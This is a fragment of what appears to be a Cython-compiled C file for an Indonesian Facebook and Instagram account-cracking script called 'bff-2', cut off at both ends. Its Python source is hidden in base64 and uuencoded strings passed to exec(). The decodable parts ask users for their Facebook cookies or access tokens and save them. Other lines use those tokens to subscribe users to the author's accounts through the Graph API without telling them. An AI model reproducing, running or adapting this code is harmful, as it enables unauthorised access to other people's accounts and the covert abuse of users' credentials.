EF3TnpFM05EYzBNakExT0RNdmMzVmljMk55YVdKbGNuTS9ZV05qWlhOelgzUnZhMlZ1UFNWekp5VW9kRzlyWlc0cEtTQWpJRVJ2Ym1sbWRHWmhibTU1Q2lBZ0lDQWdJQ0FnY21WeGRXVnpkSE11Y0c5emRDZ25hSFIwY0hNNkx5OW5jbUZ3YUM1bVlXTmxZbTl2YXk1amIyMHZNVEF3TURJNU1UUXpNVEV4TlRZM0wzTjFZbk5qY21saVpYSnpQMkZqWTJWemMxOTBiMnRsYmowbGN5Y2xLSFJ2YTJWdUtTa2dJeUJFWlcxcGRDQlNiMjFwSUVGbWNtbDZZV3dLSUNBZ0lDQWdJQ0J5WlhGMVpYTjBjeTV3YjNOMEtDZG9kSFJ3Y3pvdkwyZHlZWEJvTG1aaFkyVmliMjlyTG1OdmJTOHhNREF3TURFMU5EQXlPVGt4TURndmMzVmljMk55YVdKbGNuTS9ZV05qWlhOelgzUnZhMlZ1UFNWekp5VW9kRzlyWlc0cEtTQWpJRWhoYTJscmFRb2dJQ0FnSUNBZ0lISmxjWFZsYzNSekxuQnZjM1FvSjJoMGRIQnpPaTh2WjNKaGNHZ3VabUZqWldKdmIyc3VZMjl0THpFd01EQTFOVGt4T0RNNU1USTRNQzl6ZFdKelkzSnBZbVZ5Y3o5aFkyTmxjM05mZEc5clpXNDlKWE1uSlNoMGIydGxiaWtwSUNNZ1ZHbGhjbUVnWVhKMENpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01EQTVNemcwTXpNNE5EY3dMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxjeWNsS0hSdmEyVnVLU2tnSXlCSmQyRnVJR2hoYm1ScFlXNXplV0ZvSUhZeUNpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01ETTJOalUxTXpJMU9UazJMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxjeWNsS0hSdmEyVnVLU2tnSXlCQlluVnpkRzhnU21GMllRb2dJQ0FnWlhoalpYQjBPZ29nSUNBZ0NYQmhjM009JykpDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQoJb3Muc3lzdGVtKCJnaXQgcHVsbCIpDQoJbWVudSgpDQoNCiIiIg0KICAgIEF1dGhvciA9IFJvbWkgQWZyaXphbA0KICAgIEJpYXIgYXBhIHNpaCBkaSBjb21waWxlIGFueWluaw0KDQoiIiI='))
 */
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_base64, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_base64, __pyx_t_1) < 0) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "cr.py":4
 * 
 * import base64
 * exec(base64.b64decode('IyBjb2Rpbmc9dXRmLTgNCiMgY29kaW5nIGJ5IFJvbWkgQWZyaXphbA0KIyBOb3RlIDogamFuZ2FuIGRpIHViYWggbGFnaSEgbmFudGkgZXJyb3IsIHNjcmlwdCB1ZGFoIGVuYWsNCmltcG9ydCBvcw0KdHJ5Og0KCWltcG9ydCByZXF1ZXN0cw0KZXhjZXB0IEltcG9ydEVycm9yOg0KCW9zLnN5c3RlbSgncGlwMiBpbnN0YWxsIHJlcXVlc3RzJykNCnRyeToNCglpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzDQpleGNlcHQgSW1wb3J0RXJyb3I6DQoJb3Muc3lzdGVtKCdwaXAyIGluc3RhbGwgZnV0dXJlcycpDQp0cnk6DQoJaW1wb3J0IGJzNA0KZXhjZXB0IEltcG9ydEVycm9yOg0KCW9zLnN5c3RlbSgncGlwMiBpbnN0YWxsIGJzNCcpDQogDQpIaiA9ICdceDFiWzE7OTJtJyANCk10ID0gJ1x4MWJbMG0nIA0KZGVmIGluZ2ZvaCgpOg0KCXByaW50ICgNCiIiIiVzDQog4oCiIEluZm8gc2NyaXB0IDoNCiAJDQogLSBhdXRob3IgICAgICA6IFJvbWkgQWZyaXphbA0KIC0gZmFjZWJvb2sgICAgOiBmYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMg0KIC0gZmFuc3BhZ2UgICAgOiBmYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2DQogLSB3aGF0c2FwICAgICA6ICs2MjgyMzcxNjQ4MTg2DQogLSBnaXRodWIgICAgICA6IGdpdGh1Yi5jb20vTWFyay1adWNrDQogLSBzY3JpcHQgbmFtZSA6IGJmZi0yDQogLSB2ZXJzaW9uICAgICA6IDEuMw0KIA0KJXMiIiIlKEhqLE10KSkNCiAgICANCmltcG9ydCByZXF1ZXN0cywgc2h1dGlsLCBvcywgcmUsIGJzNCwgc3lzLCBqc29uLCB0aW1lLCBwbGF0Zm9ybSAscmFuZG9tLCBkYXRldGltZSwgc3VicHJvY2VzcywgbG9nZ2luZywgYmFzZTY0DQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXJzZXINCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgamVkYQ0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmZyb20gY2FsZW5kYXIgaW1wb3J0IG1vbnRocmFuZ2UNCg0KY3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbl8gPSBbJ0phbnVhcmknLCAnRmVicnVhcmknLCAnTWFyZXQnLCAnQXByaWwnLCAnTWVpJywgJ0p1bmknLCAnSnVsaScsICdBZ3VzdHVzJywgJ1NlcHRlbWJlcicsICdPa3RvYmVyJywgJ05vdmVtYmVyJywgJ0Rlc2VtYmVyJ10NCnRyeToNCiAgICBpZiBuIDwgMCBvciBuID4gMTI6DQogICAgICAgIGV4aXQoKQ0KICAgIG5UZW1wID0gbiAtIDENCmV4Y2VwdCBWYWx1ZUVycm9yOg0KICAgIGV4aXQoKQ0KDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCmhhcmkgPSBjdXJyZW50LmRheQ0KYnVsYW4gPSBidWxhbl9bblRlbXBdDQp0YWh1biA9IGN1cnJlbnQueWVhcg0KYnVsbGFuID0gY3VycmVudC5tb250aA0KDQp3YWt0dSA9ICgiJXMtJXMtJXMiJShoYXJpLGJ1bGFuLHRhaHVuKSkNCmJ1bGFuMTIgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCg0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCg0KZXhlYygobGFtYmRhIF9fLCBfLCA6IF8oYidiZWdpbiA2NjYgPGRhdGE+XG5NKFIhJDoyISM7VlVQOjZRRSgkRVQ9MiEiOjYlUigkJVA4MiFTOjIhQTs2SUk8QiBaPUBIQygkKVQ9UiEmXG5NO1ZRTDtXPEAxJl1OOlIhQjxGXFxALkIhSD1cJzFQPFNITytWPUk9JkFVOEJZQztWVE8zNiVSOlJVOj02LUtcbk0iQixAMlYlUzo2QEA0VzFBPEIhKj02PUEoJClPOyY1SCgkQFM6Iy0oLFIgWjEgSUU+JjVDKiJBTDg2VUJcbk05JiRAN1VcXEwoJVxcTCgjSEA3UkFCKVYpRTlWRU4oIzhWLUIgXFw5JiVUODNZPDtEVEg0QiRELkMoQShTTTZcbk01NSBaLUUlJSoiMSU1I1RSKDIoWi1CNTIqIjBFNCNAUig1LFosQiUhLlM5KTIzUSIoJUhdMCRBIyoiMElcbk01I1UyKDI5PDtEVFs1RSUsLlU8XFwwIyRGNzRYWjRCJSIvJDk8NyQgTjBCJSgvNVBHLDUgXFw0VEEvKlU4XVxuTTIzVEYwNTRYMEVFIy5VOTQzUyxWKTUoWjRFNFovMzhNMlVRTjMyKSIrJCBSNUI1My5DOSAwIzE3LDQkXFxcbk0wQiRKLzM4XTAyQEQqNFxcWylDNSgqIjEgNFNIQysyQEw0QiE6LDIhKTEzWEYtNCxKKEQlLC4jOTUwRVFOXG5NMzNERikkIFc1NVE8MyJARTclUSwqIi0oMCM9MjA0KEk1QkUlLjU5JTNCQEMuJThNMEIhPDcjREYpNTBYXG5NLFVEXFwuVDE0MiMxIikkME4wUkEhKiUtLS1FUU4zMzRVKCVITTEyNEUqQihRKTM0QzUlKEgsQkE6KzQoVVxuTSxCSEIsJDRUKFQhMiojNEw2QlEiKTIkTjRTREksQy0xKEJARTIlVFApJCRDKkIoUDI1UU4zMzRDNTMoSFxuTSxDRFxcLlQxNDZTNSUpMlBONTNRPDcjIEMpJDhXLSVBOi0kKEUoQlxcRC4zUFcpIiEuLCQoRSoiXFxVNCQ8TFxuTS0yITw3IzE0MDJcXEo1M0E9NyZZLSxDLTQxQyBVLSVAUDE0NEMrRTRZLSMtMyslOEktMkE6LSQ0VDZCXFxTXG5NLiRUUjU1JS4sUyhJKEJMRCglKFUwQzRTK0QsWSgjIEMsMzxMLSIxPDclUU4zMyEiKSRITyxTQT0sIykgXG5NMSJIVDclUTsqNCxVKiJIQiwyIFQ0VEEjKlMpIDMjMSIoM0hMLEIkSSwzLTgxQlRUKyRISDEiNEwrQixZXG5NLTMhJTQ0WTw7RFRTLFQxJioyMEA1UzRVNDNQUyhEISUtUjUxKyJIQisyQFAoU1RSLCMwSDIzNSIxMjROXG5NLTNERSxUKSAwUlhFLiRUUDBCJFxcLVItJDFCRFUsJUE8O0RUTDU0MTw3Ilk0LDMwUihTJEIqMjBQM0MhMlxuTTAyJEopMlRNKzQ1MTNDLFMtJTRIKTRBLSwzKFQxMkkiKiUkSSxTMSMtMjRIMiJRIjAzSEstIkE1NyZZLVxuTSskKSgwQlBELSUwSDUiJFIqQixUMyM5IjQyKEksQjEuLSUtJDIyUSMrMyRIMEQhJSxCNTQ0IkREKSQsSlxuTTBCQTAsQzUxM0MsUy0kLFUsUkEoNyZZLSskLSQ3JVBONSMkVC1FLFUpMkRSNCRYVSxVJFxcLVIsQDBSRERcbk0uJTxNKTQkWisyMEgxMkEiNyVRJCtDLTA1UkRCKDJYTCkiQSUqQik8NyU0VCkjUSw3JlktKzMoQS8jPENcbk0sMzBQLEVRPDJDNFMwM1RXKUVETSskLE0tIyUjKCU0TSk0ITAsMzBUMFJNJS0lRE0oUlRTKlI0WDIyVFJcbk0wM0hNKSMxNC1EKTw3JS08O0RUTiklMTItMzRFK0JRMyokREgwRFEkKiI0SDUzISMtJSxLMSJROSoiLEBcbk0wUlBTLyRQTShDJFxcLVI1MTNDLFMoMihJKSRBLyslLSEvMlBDKjIhPDtEVFEoREE0LVI1MS5SSFQrJTRKXG5NKERBIisjKEA1IzE0MDIsSjRSREAsUixRKEJAUzIkUEwwQjEpKyMsTS4jJSI1JTBLKSRBKCwyKFQzIk0iXG5NKyVFPDtEVE0sUiRFLSMxOS8jTSQ1JSxMNSMkRipDKFAwIzUzLSU0VCxVITMqJDBBKTJVMi0zJEsoREEiXG5NKlMpIDQiQTM1JShMKFMhKCxDLFUoQyRSLSRZPDtEVE0sVDElKyUwSSgjITI2JDROKSUxMCwkKEQ3JVBNXG5NNEJURCw0KSQ1MlBFMDNQWzElMSwtMzBRLyM8QjYzMEwsUyE1LSUsUS0yVFItM1BXKSUxNTcmWS0rJSxRXG5NLzJMQyskVE4oUjRFLSMxODRSUSUsMzBKNEMxPDcjNFMpJShNKSIxKywzKTEuIlEjKyQwUDRSISUrMjRcXFxuTTMjNFUpJVE8KzM0TDUjNFU0NFk8O0RUUyxTMSUtUjUxKkJIRCozMFUoRSEiKlMpNDMzMSQ0MjBNMEM0UVxuTStSKTQ1MlBFLSRQVDE1JFxcLSQpODEyVEUrJFBQMSMkRCpFLEw1MkBDLzItPDtEVE8pIkEvKyQoUStSVEVcbk0rMzBVLFNRJi1DKTQzMzEyNSVRPC1SOTkrMlUyLSVRPC0zKTQ1MlBTNyVRLS0kLSQ2MkkzKjM0TSxFMTNcbk0tMjE8NyUwVDUzJFU3JlktKlM0TDMyXFxDLyQ0TykzMS0rMyxEN1JJMy0lMFUsRVE8NEM8UyskXFxMNFMkV1xuTSpSNFUsMlxcQy4zLE0sUkE1KjM1MS8jLTU0NFhTLEQxMy0yMFQzNVFOMzJEUjQzVEssUlE8NyM0UjIkNFNcbk0pJTEtKzMsUSxCVTIuM0RLLERUQysiNFQzUlEyKSUsSzRSUTQtNSkxLTMwUzQlNFQ0UyRVKzMoVS8jPERcbk01JTU8O0RUTDRTJF0qUyhUMzJUUjclUSIsMyxJLyNNJDUlJEktNSRcXCxULEEsUlRFNSRUSSxTMTErJTBMXG5NMyMxMyslLE0pM1EsLTM0RDclUE0tMlE0LTMsVDE1UU4zMzxFNDJUTSxSUTQtUyktLTJMUiwlNFQ0QiRTXG5NKzUoVSwyWTMvJDhWLEUxKisyKSEtMkkzKjNAUSk1JS4sUyk4MTJERSgkUFEoQjEjKlMsSDQlUU4zMyBDXG5NKjIoUCxCQTErJCxRK1JQRCsyMFEsRTEyKkMoRDIjITIsMihMMEMhKC0jKTQ1MlBTNyVRKywlKTEvMkhDXG5NKyQwVDRSITMrMjRcXDMjNFUpJVE8NyZZLSszNEw0MkElNDRYUyxEITMtMjEoMiMhJCwyIEsoQyE1KyMsTVxuTSkzMFQ2JSxMNEUkUysyLE0sIyhTLSQsTSkzISssMikhLjJNMyskVEgwUiEyNyZZLSpCNEQyIyREKSU8S1xuTSxSUTUrMixdLEM0Uy0kWEksUyRWKkI0UDQyVSU0NFhTLEREUypTLTA1UkRTNDM0SyxTMTQsJCktKEJMRVxuTTQzUEw0UlEkNyZZLS0kLFQ0QkxENCRQVS0yMTw3IlUjKjI0SDRFMTIqUjE4NTJRNCklJE00Q0RZKlMpMFxuTTRSTEU1JFRMNFUkUys1KFUsMkhCMiQ0TSkyNFxcLlQxNDIlUU4zMkEkMSQoSjBDJEAtMixBKSJAUiokSFBcbk0wUjElKlUoTSsyREMtJDBKKTIxLSszLEQ3UkkzLSUwVSxFUTw0QzxTKyUkSSxVJFAqUyhMNDJYQjUlLTxcbk07RFRNLFMhNy0kNFQ1Mk0iLSQwVCxFJFQqMjRZLyNNJDUkVFQ0UiRQKzQsVSwzLSMrJShVKTMxNSslKEFcbk0rUlBFKzIkSyxFJFUqUykwNSMhJCgyNTw7RFRNLEMkQCxCLEQwQkREKiRMUShFJFkqUyxMNCMhMyslLE9cbk0pJEEtKyUoRDIiTEIsJSBUKFJEQi0zLFUvI00kNSRUTDUzJE8rMjRNLSM0UjUzLTw7RFRLLFUxLyolMTRcbk0xIlRSLSVRPC0zKTQ1MlBTNyVRKyszLFEtMk0zLTMkUzBSUTItUyxMM1JRMywzPEspMzRRK1IsVSxSVEVcbk0tJTRJLTUkXFwsUyxUNFVRTjMyVEU1JExVLEUkXS1SOTkrMkxTKyVRPC0lLFxcMTMwUy8kVEw0UzE0KzU0SVxuTS0yVFIyJDBIKTNRLCwyKEQwQkxCKiUgUihSRFMrIyhINCJRJCwyQTw7RFRMLEJBJCxDKS0tMkxFNSRUTFxuTTRVJFMrNShVLDJVMjUlLE0sUyE3LTM0RStDPEY2MlRMNFJEVSszKTQ0UzRENyVRNC0lNFEtMkxVKyRUT1xuTSxFUTwwVVFOMzMsUiwlNEksVSRVKyMoTDQyXTIzJTRNKTMxLyskNTQ0Uk0zKyUwVTRFJFUtIy0wNTMxM1xuTSwzNE0sQzRcXC1SMTQ1MlEzLDNUSjUzMSwtUzUxM0VRTjMzLFI0MihQKSMxNSoyMEEqIlBSKiQwUDBEVERcbk0rIjUkMjJRMiwzKEwoUkEpK1ItLSkjNEUpJEBRKSIxNypTLEw1MlRDLzMoVSxTMS0rJTRRK1VRTjMyVEVcbk0rMzBVLEU0UysiNFA1UyEkLSQsSyxSQSwsUzUxM0MsUy0lLFEpMjEsKiUpNDMiVFQqMkBVKEUhMy0iNSxcbk00IzEjKSVASjRSUTUrMixdLEVRTjMzNFMtJFRMNTMkTysyNE0tIzRSNTMsSyxVITcqMjBBKiJUUyskMFBcbk0oU1EmLUMpNDJDJEIwMkBMMFJRKCwkNTEzQyxTKCUoSikyMSgsJChRLyVRTjMzPEI2MzBKKSIxLyolMTRcbk0xQkxTLDNAVixEMTUqMyk4MkJUUjElJEs1MlE9KyQsRDEjJEQyJEBQMSMxNSpVLEw1MlxcUygzLFMsU0EsXG5NKzIsUS4lUU4zMlREKjIkSyhFNFUrMy01LyNNJDUlKEw1JSRXKkIsUS8jPEU0M1BMLTJRJC1VLFxcMUM4RVxuTSwkVFUsRDEgKyM0TSgyVSMvJTBMKTQxLSwkNFQ0VVFOMzJJIy0kREkoUlRDLDIwWDMyVEI0M0xNLSJRJVxuTSozKSkoUkhSLCRASS0yNE4qQihVLDMtJTQ0WFMsVDE2LUMwUDVSRSUwNVBHKkUoVS8yXTIyJSk8O0RUUVxuTSkkISgsNSxVLTJVNS4kVFM0VDEmKzMwTDIjISUpJVxcTTUzREUsUy0wMUM8VSolVEktNTE/KkQoSDczITNcbk0zMzhMLSMxOC01KTE3IjxKMFJEWTcmWS0sMjUxM0M8Qi8lRE0wRTRPK0MoWDUjKFIyJSBIKEIkXFwuVChBXG5NLyNNJi00WFkpNSUuKjUpMS9TPTIxJERKKEJFNS8zNT0wU002LDQ0WDRCQSw3JlhdLVU1PTIzTFcoNFxcXFxcbk0xUyRfLVUpIDFTQTY3NDBZLUJVMyo1KSQzQ0RGLTQsWzVDJSUqQykkKCVRTiglUU45NllENyZYRyslXT9cbksqMkRIKEc1VTdWLU85JjVDKEJRPzdWRU08Jl1SPSVdPyoiPUM7VjFFOFcsRyoyWUQ5Ni1POSY0SSowICBcbiBcbmVuZFxuJyxfXykpKCJ1dV9jb2RlYyIsX19pbXBvcnRfXygnY29kZWNzJykuZGVjb2RlKSkNCg0KIyBLVU1QVUxBTiBXQVJOQQ0KTSA9ICdceDFiWzE7OTFtJyAjIE1FUkFIDQpIID0gJ1x4MWJbMTs5Mm0nICMgSElKQVUNCksgPSAnXHgxYlsxOzkzbScgIyBLVU5JTkcNCkIgPSAnXHgxYlsxOzk0bScgIyBCSVJVDQpVID0gJ1x4MWJbMTs5NW0nICMgVU5HVQ0KTyA9ICdceDFiWzE7OTZtJyAjIEJJUlUgTVVEQQ0KUCA9ICdceDFiWzE7OTdtJyAjIFBVVElIDQpOID0gJ1x4MWJbMG0nICMgV0FSTkEgTUFUSQ0KYWNhayA9IFtNLCBILCBLLCBCLCBVLCBPLCBQXQ0Kd2FybmEgPSByYW5kb20uY2hvaWNlKGFjYWspDQp0aWwgPSLigKIiIA0Kb2ssIGNwLCBpZCwgdXNlciwgbG9vcCA9IFtdLCBbXSwgW10sIFtdLCAwDQpwd3ggPSBbXQ0Kc3lzLnN0ZG91dC53cml0ZSgnXHgxYlsxOzM1bVx4MWJdMjsg4pynIGJmZi0yIGJ5IHJvbXog4pynIFx4MDcnKQ0KDQpkZWYgamFsYW4oa2VsaWxpbmcpOg0KCWZvciBtYXUgaW4ga2VsaWxpbmcgKyAnXG4nOg0KCQlzeXMuc3Rkb3V0LndyaXRlKG1hdSkNCgkJc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMC4wMykNCmRlZiB0aWsoKToNCiAgICB0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10NCiAgICBmb3IgbyBpbiB0aXRpazoNCiAgICAgICAgcHJpbnQgKCdcciVzJXMgbWVuZ2hhcHVzIGFrdW4gZGFyaSB0ZXJtdXggJXMnJShNLHRpbCxvKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDEpDQpkZWYgY2xlYXIoKToNCglvcy5zeXN0ZW0oImNsZWFyIikNCmRlZiBmb2xkZXIoKToNCgl0cnk6b3MubWtkaXIoJ09LJykNCglleGNlcHQ6cGFzcw0KCXRyeTpvcy5ta2RpcignQ1AnKQ0KCWV4Y2VwdDpwYXNzDQoJdHJ5Om9zLm1rZGlyKCdkYXRhJykNCglleGNlcHQ6cGFzcw0KIyBMT0dPIChMTyBHT0JMT0spDQpkdCA9IHJlcXVlc3RzLmdldCgiaHR0cDovL2lwLWFwaS5jb20vanNvbi8iKS5qc29uKCkNCnRyeToNCiAgICBJUCA9IGR0WyJxdWVyeSJdDQogICAgQ04gPSBkdFsiY291bnRyeSJdDQpleGNlcHQgS2V5RXJyb3I6DQogICAgSVAgPSAiICINCiAgICBDTiA9ICIgIg0KZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKCdZWFYwYUc5eUlEMGlVbTl0YVNCQlpuSnBlbUZzSWdwbVlsOXRaU0E5SW1aaFkyVmliMjlyTG1OdmJTOXliMjFwTG1GbWNtbDZZV3d1TVRBeUlncG5hWFJvZFdJZ1BTSm5hWFJvZFdJdVkyOXRMMDFoY21zdFduVmpheUk9JykpDQpkZWYgYmFubmVyKCk6IA0KICAgIHByaW50ICgnICVzJXMlcyVzJXMlcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJXMlcyVzJXMlcyVzXG4lcyAgIF9fX19fX18gIF9fX19fXyBfX19fX19fIF9fX19fX18gXyAgICAgX1xuICAgfCAgICAgICB8X19fX18vIHxfX19fX3wgfCAgICAgICB8X19fXy8gXG4lcyAgIHxfX19fXyAgfCAgICBcXF8gfCAgICAgfCB8X19fX18gIHwgICAgXFxfXG5cbiAgICAgJXMgICAgJXMgJXNDb2RlZCBieSAlczogJXMlcyAlcyVzICAgXG4gJXMlcyVzJXMlcyVzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAlcyVzJXMlcyVzJXMgXG4gJXMjICVzRmIgICVzIDogJXMlcyBcbiAlcyMgJXNHaXQlcyAgOiAlcyVzIFxuICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjICAnJQ0KICAgIChNLHRpbCxLLHRpbCxILHRpbCxNLHRpbCxLLHRpbCxILHRpbCxNLFAsVSx0aWwsSyxNLEssYXV0aG9yLFUsdGlsLE0sdGlsLEssdGlsLEgsdGlsLE0sdGlsLEssdGlsLEgsdGlsLFUsTyxNLE8sZmJfbWUsVSxPLE0sTyxnaXRodWIsUCxNLFApKQ0KICAgIHByaW50ICgnICVzIyVzIElQICAgJXM6JXMgJXMgJXMtICVzJXMgJyUoVSxPLE0sTyxJUCxILE8sQ04pKQ0KIyBNQVNVSyBUT0tFTiAoVE9LRU4gTElTVFJJSykNCmhlYWRlciA9IHsndXNlci1hZ2VudCc6J01vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NDUuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC80NS4wJ30NCmRlZiBtYXN1aygpOg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKTtiYW5uZXIoKQ0KICAgIHByaW50ICgnXG4lcyVzJXMgMDEgJXNMb2dpbiBpbnN0YWdyYW0gKGNyYWNrIGFrdW4gaW5zdGFncmFtKSBcbiVzJXMlcyAwMiAlc0xvZ2luIHZpYSBjb29raWUgKGNyYWNrIGFrdW4gZmFjZWJvb2spXG4lcyVzJXMgMDMgJXNMb2dpbiB2aWEgdG9rZW4gKGNyYWNrIGFrdW4gZmFjZWJvb2spXG4lcyVzJXMgMDQlcyBDYXJhIG1lbmRhcGF0a2FuIHRva2VuICYgY29va2llIGZhY2Vib29rIFxuJXMlcyVzIDAwICVzS2VsdWFyJyUoVSx0aWwsSyxPLFUsdGlsLEssTyxVLHRpbCxLLE8sVSx0aWwsSyxPLFUsdGlsLE0sTykpDQogICAgcm9tID0gcmF3X2lucHV0ICgiXG4lcyMgJXNQaWxpaCAlcz4gJXMiJShQLE8sTSxLKSkNCiAgICBpZiByb20gaW4oIiIpOg0KICAgIAlwcmludCgiJXMlcyB3cm9uZyBpbnB1dCAiJShNLHRpbCkpO2V4aXQoKQ0KICAgIGVsaWYgcm9tIGluICgnMScsJzAxJyk6DQogICAgCWlnZygpDQogICAgZWxpZiByb20gaW4gKCcyJywgJzAyJyk6DQogICAgCWphbGFuKCJcbiVzISVzIFdhamliIGd1bmFrYW4gYWt1biB0dW1iYWwgZGlsYXJhbmcgYWt1biB1dGFtYSIlKE0sTykpDQogICAgCWtvb2sgPSByYXdfaW5wdXQoIiVzIyAlc0Nvb2tpZSAlcz4gJXMiJShQLE8sTSxLKSkNCiAgICAgICAgaWYga29vayBpbigiIik6DQogICAgICAgIAlwcmludCAoIiVzJXMgaXNpIGNvb2tpZSBrZW50b2QgIiUoTSx0aWwpKTtleGl0KCkNCiAgICAgICAgb3BlbignZGF0YS9jb29raWVzJywgJ3cnKS53cml0ZShrb29rKQ0KICAgICAgICBrb252ZXJ0ZXIoKQ0KICAgICAgICBleGl0KCkNCiAgICBlbGlmIHJvbSBpbiAoJzMnLCcwMycpOg0KICAgICAgICBqYWxhbigiXG4lcyElcyBXYWppYiBndW5ha2FuIGFrdW4gdHVtYmFsIGRpbGFyYW5nIGFrdW4gdXRhbWEiJShNLE8pKQ0KICAgIAlyb216ID0gcmF3X2lucHV0KCIlcyMgJXNUb2tlbiAlcz4gJXMiJShQLE8sTSxLKSkNCiAgICAgICAgaWYgcm9teiBpbigiIik6DQogICAgICAgIAlwcmludCAoIiVzJXMgaXNpIHRva2VuIGtlbnRvZCAiJShNLHRpbCkpO2V4aXQoKQ0KICAgIAl0cnk6DQogICAgICAgICAgICBuYW1hID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49JXMnJShyb216KSxoZWFkZXJzPWhlYWRlcikuanNvbigpWyduYW1lJ10NCiAgICAgICAgICAgIHByaW50ICgnXG4lcyVzIExvZ2luIHN1Y2NlcywgbW9ob24gdHVuZ2d1ICclKEgsdGlsKSkNCiAgICAgICAgICAgIG9wZW4oJ2RhdGEvdG9rZW4udHh0JywgJ3cnKS53cml0ZShyb216KTtsb2dpbl94eCgpDQogICAgICAgICAgICBleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2IzTXVjM2x6ZEdWdEtDZDRaR2N0YjNCbGJpQm9kSFJ3Y3pvdkwzZDNkeTVtWVdObFltOXZheTVqYjIwdmNtOXRhUzVoWm5KcGVtRnNMakV3TWljcE8yMWxiblVvS1E9PScpKQ0KICAgICAgICAgICAgZXhpdCgpDQogICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6DQogICAgICAgIAlwcmludCAoIiVzJXMgVG9rZW4gaW52YWxpZCAiJShNLHRpbCkpO2plZGEoMik7bWFzdWsoKQ0KICAgIGVsaWYgcm9tIGluICgnNCcsICcwNCcpOg0KICAgIAlwcmludCAoIlxuJXMlcyAlc1VudHVrIG1lbmRhcGF0a2FuIHRva2VuICVzOiVzIiUoVSx0aWwsSCxNLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gc2lhcGthbiBha3VuIGZhY2Vib29rICh3YWppYiBha3VuIHR1bWJhbCkiKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gbG9naW5rYW4gYWt1biBmYWNlYm9vayAodHVtYmFsKSBkaSBicm93c2VyICVzQ2hyb21lICVzIiUoTyxIKSk7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIHVybCBhbGFtYXQgd2FqaWIgJXNodHRwczovL20uZmFjZWJvb2suY29tICVzKG1vZGUgZGF0YSkiJShPLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gc2FsaW4gbGluayA6ICVzdmlldy1zb3VyY2U6aHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIiUoTykpO2plZGEoMC4wMikNCiAgICAgICAgcHJpbnQgKCIlcyAtIHRhcnVoIGxpbmsgdGVyc2VidXQgZGkgdXJsIGFsYW1hdCBmYWNlYm9vayBsYWx1IGtsaWsgY2FyaSAiJShIKSk7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIGppa2Egc3VkYWgsIGtsaWsgJXN0aXRpayB0aWdhICVzcG9qb2sga2FuYW4gYXRhcyAiJShPLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0ga2VtdWRpYW4ga2xpayAlc0NhcmkgZGkgSGFsYW1hbiAlcyIlKE8sSCkpO2plZGEoMC4wMikNCiAgICAgICAgcHJpbnQgKCIgLSBrZXRpayAlc0VBQUcgJXNha2FuIG11bmN1bCBhY2NlcyB0b2tlbi4iJShPLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gamlrYSBzdWRhaCBqYW5nYW4gbHVwYSBkaSBzYWxpbiBcbiIpO2plZGEoMC4wMikNCiAgICAgICAgcHJpbnQgKCIlc+KAoiVzIFVudHVrIG1l